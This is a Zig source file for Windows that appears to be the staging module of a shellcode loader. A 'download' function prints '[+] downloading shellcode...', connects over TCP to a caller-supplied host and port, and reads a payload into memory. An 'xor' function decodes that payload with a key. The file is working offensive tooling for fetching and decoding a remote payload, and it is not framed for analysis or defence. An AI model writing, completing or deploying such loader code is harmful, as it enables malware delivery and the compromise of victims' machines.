const std = @import("std");
const windows = std.os.windows;
const ws2_32 = windows.ws2_32;

pub fn download(allocator: std.mem.Allocator, host: []const u8, port: u16, size: u32) ![]u8 {
    std.debug.print("[+] downloading shellcode...\n", .{});

    var wsaData: ws2_32.WSADATA = undefined;
    const result = ws2_32.WSAStartup(0x0202, &wsaData);
    if (result != 0) {
        std.debug.print("WSAStartup failed with error: {}\n", .{result});
        return error.WSAStartupFailed;
    }
    defer _ = ws2_32.WSACleanup();

    const sock = ws2_32.socket(ws2_32.AF.INET, ws2_32.SOCK.STREAM, ws2_32.IPPROTO.TCP);
    if (sock == ws2_32.INVALID_SOCKET) {
        std.debug.print("socket failed with error: {}\n", .{ws2_32.WSAGetLastError()});
        return error.SocketCreationFailed;
    }
    defer _ = ws2_32.closesocket(sock);

    var server_addr: ws2_32.sockaddr.in = .{
        .family = ws2_32.AF.INET,
        .port = ws2_32.htons(port),
        .addr = ws2_32.inet_addr(host.ptr),
        .zero = [8]u8{ 0, 0, 0, 0, 0, 0, 0, 0 },
    };

    const connect_result = ws2_32.connect(sock, @ptrCast(&server_addr), @sizeOf(ws2_32.sockaddr.in));
    if (connect_result == ws2_32.SOCKET_ERROR) {
        std.debug.print("connect failed with error: {}\n", .{ws2_32.WSAGetLastError()});
        return error.ConnectionFailed;
    }

    var buffer = try allocator.alloc(u8, size);
    errdefer allocator.free(buffer);

    var total_received: usize = 0;
    while (total_received < size) {
        const bytes_received = ws2_32.recv(sock, buffer[total_received..].ptr, @intCast(buffer.len - total_received), 0);
        if (bytes_received > 0) {
            total_received += @intCast(bytes_received);
        } else if (bytes_received == 0) {
            break;
        } else {
            std.debug.print("recv failed with error: {}\n", .{ws2_32.WSAGetLastError()});
            return error.ReceiveFailed;
        }
    }

    return buffer[0..total_received];
}

pub fn xor(data: []u8, key: []const u8) void {
    for (data, 0..) |*byte, i| {
        byte.* ^= key[i % key.len];
    }
}
